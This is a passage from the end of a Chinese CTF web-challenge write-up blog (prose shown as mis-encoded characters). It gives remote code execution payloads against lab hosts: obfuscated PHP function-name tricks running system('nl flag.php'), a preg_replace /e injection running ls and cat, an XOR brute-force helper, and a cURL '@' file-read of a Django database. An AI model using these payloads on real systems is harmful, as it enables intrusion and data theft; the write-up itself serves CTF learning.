<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920150729700.png" alt="image-20240920150729700"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920150601385.png" alt="image-20240920150601385"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920150625880.png" alt="image-20240920150625880"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:55626/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;min&#125;)&amp;pi=system&amp;min=nl flag.php</span><br></pre></td></tr></table></figure>

<h3 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure>

<p>headerä¼ å‚</p>
<h3 id="æ³•ä¸‰"><a href="#æ³•ä¸‰" class="headerlink" title="æ³•ä¸‰"></a>æ³•ä¸‰</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="XCTF-ics-05"><a href="#XCTF-ics-05" class="headerlink" title="XCTF ics-05"></a>XCTF ics-05</h3><p>å‰é¢æ–‡ä»¶è¯»å–ä¸è¯´äº† å¾—åˆ°æºç åx-forwarded-for adminç™»å½•</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920161747050.png" alt="image-20240920161747050"></p>
<p>preg_replaceå‡½æ•°&#x2F;eæ¼æ´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚</span><br><span class="line">æç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨æŠ¥å‘Šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ã€‚</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/abc/e&amp;rep=system(&quot;ls&quot;)&amp;sub=abc</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:52555/index.php?pat=/abc/e&amp;rep=system(&quot;cat s3chahahaDir/flag/flag.php&quot;)&amp;sub=abc</span><br></pre></td></tr></table></figure>

<h2 id="XCTF-Cat"><a href="#XCTF-Cat" class="headerlink" title="XCTF Cat"></a>XCTF Cat</h2><p>ä¸æ˜¯ä¼ ç»Ÿçš„å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920181926566.png" alt="image-20240920181926566"></p>
<ul>
<li>php cURL <code>CURLOPT_SAFE_UPLOAD</code></li>
<li>django DEBUG mode</li>
<li>Djangoä½¿ç”¨çš„æ˜¯gbkç¼–ç ï¼Œè¶…è¿‡%F7çš„ç¼–ç ä¸åœ¨gbkä¸­æœ‰æ„ä¹‰</li>
<li>å½“ <code>CURLOPT_SAFE_UPLOAD</code> ä¸º true æ—¶ï¼Œå¦‚æœåœ¨è¯·æ±‚å‰é¢åŠ ä¸Š@çš„è¯phpcurlç»„ä»¶æ˜¯ä¼šæŠŠåé¢çš„å½“ä½œç»å¯¹è·¯å¾„è¯·æ±‚ï¼Œæ¥è¯»å–æ–‡ä»¶ã€‚å½“ä¸”ä»…å½“æ–‡ä»¶ä¸­å­˜åœ¨ä¸­æ–‡å­—ç¬¦çš„æ—¶å€™ï¼ŒDjango æ‰ä¼šæŠ¥é”™å¯¼è‡´è·å–æ–‡ä»¶å†…å®¹ã€‚</li>
</ul>
<p>0x7Fçš„ASCIIéƒ½ä¼šå¼•å‘Djangoçš„æŠ¥é”™ã€‚åœ¨urlä¸­è¾“å…¥?url&#x3D;%88,å¯ä»¥å¾—åˆ°æŠ¥é”™é¡µé¢</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920182012285.png" alt="image-20240920182012285"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920182311710.png" alt="image-20240920182311710"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920182417736.png" alt="image-20240920182417736"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920182453611.png" alt="image-20240920182453611"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/2024/07/17/web%F0%9F%90%95%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">https://xyaxxya.github.io/2024/07/17/web%F0%9F%90%95%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?1827" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/22/nodejs%E5%AD%A6%E4%B9%A0/" title="nodejså­¦ä¹ "><img class="cover" src="https://www.dmoe.cc/random.php?4532" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">nodejså­¦ä¹ </div></div></a></div><div class="next-post pull-right"><a href="/2024/07/15/24%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0/" title="24ä¸­ç§‘å®æ•°"><img class="cover" src="https://www.dmoe.cc/random.php?9211" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">24ä¸­ç§‘å®æ•°</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/2024/11/02/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="2024å¼ºç½‘æ¯"><img class="cover" src="https://www.dmoe.cc/random.php?4303" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-02</div><div class="title">2024å¼ºç½‘æ¯</div></div></a></div><div><a href="/2024/10/10/2024%E6%BA%90%E9%B2%81%E6%9D%AF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/" title="2024æºé²æ¯é«˜æ ¡ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›"><img class="cover" src="https://www.dmoe.cc/random.php?6697" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="title">2024æºé²æ¯é«˜æ ¡ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›</div></div></a></div><div><a href="/2024/10/30/2024GeekChallenge/" title="1,(I?7qH7I6YKnECh7KsAH"><img class="cover" src="https://www.dmoe.cc/random.php?4403" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-30</div><div class="title">1,(I?7qH7I6YKnECh7KsAH</div></div></a></div><div><a href="/2024/06/26/2024CISCN%E5%88%9D%E8%B5%9Bweb/" title="2024CISCNåˆèµ›web"><img class="cover" src="https://www.dmoe.cc/random.php?6641" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-26</div><div class="title">2024CISCNåˆèµ›web</div></div></a></div><div><a href="/2024/10/09/Ant%20X%20D%5E3%20CTF%202021%208-bit%20pub/" title="Ant X D^3 CTF 2021 8-bit pub"><img class="cover" src="https://www.dmoe.cc/random.php?6723" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-09</div><div class="title">Ant X D^3 CTF 2021 8-bit pub</div></div></a></div><div><a href="/2024/11/07/CTFSHOW1024%E6%9D%AF/" title="CTFSHOW1024æ¯"><img class="cover" src="https://www.dmoe.cc/random.php?5753" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-07</div><div class="title">CTFSHOW1024æ¯</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">æ˜¥é£å¾—æ„é©¬è¹„ç–¾ï¼Œä¸€æ—¥çœ‹å°½é•¿å®‰èŠ±</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>å…³æ³¨æ</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">æ…¢æ…¢æ¥ï¼Œæ¯”è¾ƒå¿«</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">æ¯æ—¥ä¸€é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow%E5%86%85%E9%83%A8%E8%B5%9B%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">ctfshowå†…éƒ¨èµ›ç­¾åˆ°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web15-Fishman"><span class="toc-number">1.2.</span> <span class="toc-text">web15 Fishman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8C%97-ez-date"><span class="toc-number">1.3.</span> <span class="toc-text">[CISCN 2023 ååŒ—]ez_date</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8C%97-pysym"><span class="toc-number">1.4.</span> <span class="toc-text">[CISCN 2023 ååŒ—]pysym</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web4"><span class="toc-number">1.5.</span> <span class="toc-text">[CISCN 2019åä¸œå—]Web4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%EF%BC%9AFlask-Session-Cookie-%E7%AE%A1%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97"><span class="toc-number">1.5.1.</span> <span class="toc-text">é™„ï¼šFlask Session Cookie ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E7%AD%BE%E5%88%B0plus"><span class="toc-number">1.6.</span> <span class="toc-text">[FSCTF 2023]ç­¾åˆ°plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-Challenge-rce"><span class="toc-number">1.7.</span> <span class="toc-text">[HNCTF 2022 Week1]Challenge__rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E8%A5%BF%E5%8D%97-do-you-like-read"><span class="toc-number">1.8.</span> <span class="toc-text">[CISCN 2023 è¥¿å—]do_you_like_read</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.9.</span> <span class="toc-text">[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP"><span class="toc-number">1.10.</span> <span class="toc-text">[é¹¤åŸæ¯ 2021]EasyP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3-%E8%8E%AB%E8%B4%9F%E5%A9%B5%E5%A8%9F"><span class="toc-number">1.11.</span> <span class="toc-text">web3_è«è´Ÿå©µå¨Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2-%E6%95%85%E4%BA%BA%E5%BF%83"><span class="toc-number">1.12.</span> <span class="toc-text">web2_æ•…äººå¿ƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-join-us"><span class="toc-number">1.13.</span> <span class="toc-text">[NISACTF 2022]join-us</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2022-ezphp"><span class="toc-number">1.14.</span> <span class="toc-text">[MoeCTF 2022]ezphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-EasyCleanup"><span class="toc-number">1.15.</span> <span class="toc-text">[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-ez-php2"><span class="toc-number">1.16.</span> <span class="toc-text">[FSCTF 2023]ez_php2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SCTF-2021-loginme"><span class="toc-number">1.17.</span> <span class="toc-text">[SCTF 2021]loginme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-ez-rce"><span class="toc-number">1.18.</span> <span class="toc-text">[NSSRound#4 SWPU]ez_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF-2020-CV-Maker"><span class="toc-number">1.19.</span> <span class="toc-text">[WUSTCTF 2020]CV Maker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-basic-check"><span class="toc-number">1.20.</span> <span class="toc-text">[NSSRound#1 Basic]basic_check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-%E5%9C%B0%E7%8B%B1%E9%80%9A%E8%AE%AF-%E6%94%B9"><span class="toc-number">1.21.</span> <span class="toc-text">[MoeCTF 2021]åœ°ç‹±é€šè®¯-æ”¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HZNUCTF-2023-final-eznode"><span class="toc-number">1.22.</span> <span class="toc-text">[HZNUCTF 2023 final]eznode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.22.1.</span> <span class="toc-text">å†…ç½®æ¨¡å—çš„å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Express%E6%A1%86%E6%9E%B6%E7%9B%B8%E5%85%B3%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.22.2.</span> <span class="toc-text">Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-number">1.22.3.</span> <span class="toc-text">è‡ªå®šä¹‰å‡½æ•°</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-real-ez-node"><span class="toc-number">1.23.</span> <span class="toc-text">[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-ez-calc"><span class="toc-number">1.24.</span> <span class="toc-text">[GFCTF 2021]ez_calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HDCTF-2023-YamiYami"><span class="toc-number">1.25.</span> <span class="toc-text">[HDCTF 2023]YamiYami</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FBCTF-2019-rceservice"><span class="toc-number">1.26.</span> <span class="toc-text">[FBCTF 2019]rceservice</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-bingdundun"><span class="toc-number">1.27.</span> <span class="toc-text">[NISACTF 2022]bingdundun~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-checkin"><span class="toc-number">1.28.</span> <span class="toc-text">[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HDCTF-2023-SearchMaster"><span class="toc-number">1.29.</span> <span class="toc-text">[HDCTF 2023]SearchMaster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE%EF%BC%9A"><span class="toc-number">1.29.1.</span> <span class="toc-text">æ ‡ç­¾ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-smarty-version"><span class="toc-number">1.29.1.1.</span> <span class="toc-text">1. {$smarty.version}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-php-php"><span class="toc-number">1.29.1.2.</span> <span class="toc-text">2.{php}{&#x2F;php}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-literal"><span class="toc-number">1.29.1.3.</span> <span class="toc-text">3.{literal}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-if-if"><span class="toc-number">1.29.1.4.</span> <span class="toc-text">4.{if}{&#x2F;if}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2019-Fake-XML-cookbook"><span class="toc-number">1.30.</span> <span class="toc-text">[NCTF 2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK2-easy-unser"><span class="toc-number">1.31.</span> <span class="toc-text">[HNCTF 2022 WEEK2]easy_unser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-RCE-PLUS"><span class="toc-number">1.32.</span> <span class="toc-text">[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]RCE-PLUS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-yet-another-mysql-injection"><span class="toc-number">1.33.</span> <span class="toc-text">[ç¬¬äº”ç©ºé—´ 2021]yet_another_mysql_injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-flask-jwt"><span class="toc-number">1.34.</span> <span class="toc-text">[NSSRound#13 Basic]flask?jwt?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E5%B0%B1%E6%9C%89flag"><span class="toc-number">1.35.</span> <span class="toc-text">ç™»é™†å°±æœ‰flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4j%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.36.</span> <span class="toc-text">Log4jå¤ç°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BB%E5%89%91%E6%9D%AF-%E8%BF%91%E5%9C%A8%E7%9C%BC%E5%89%8D"><span class="toc-number">1.37.</span> <span class="toc-text">å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#render-template-string-%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.37.1.</span> <span class="toc-text">render_template_string çš„å·¥ä½œåŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%BC%E8%87%B4-SSTI-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.37.2.</span> <span class="toc-text">å¦‚ä½•å¯¼è‡´ SSTI æ¼æ´</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.37.3.</span> <span class="toc-text">é˜²å¾¡æªæ–½</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-number">1.37.4.</span> <span class="toc-text">ä¾‹å­ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E8%BA%AB%E6%9D%AFweb%E7%AD%BE%E5%88%B0"><span class="toc-number">1.38.</span> <span class="toc-text">å•èº«æ¯webç­¾åˆ°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GHCTF-2024-PermissionDenied"><span class="toc-number">1.39.</span> <span class="toc-text">[GHCTF 2024]PermissionDenied</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%99%E4%BD%A0shell"><span class="toc-number">1.40.</span> <span class="toc-text">ç»™ä½ shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf%E5%8B%87%E9%97%AF%E9%93%9C%E4%BA%BA%E9%98%B5"><span class="toc-number">1.41.</span> <span class="toc-text">moectfå‹‡é—¯é“œäººé˜µ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BASECTF-Week2-Really-EZ-POP"><span class="toc-number">1.42.</span> <span class="toc-text">BASECTF [Week2] Really EZ POP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BaseCTF-%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82-MD5"><span class="toc-number">1.43.</span> <span class="toc-text">BaseCTF æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basectf-Week4-flag%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%9F"><span class="toc-number">1.44.</span> <span class="toc-text">Basectf [Week4] flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Basectf-Week4-No-JWT"><span 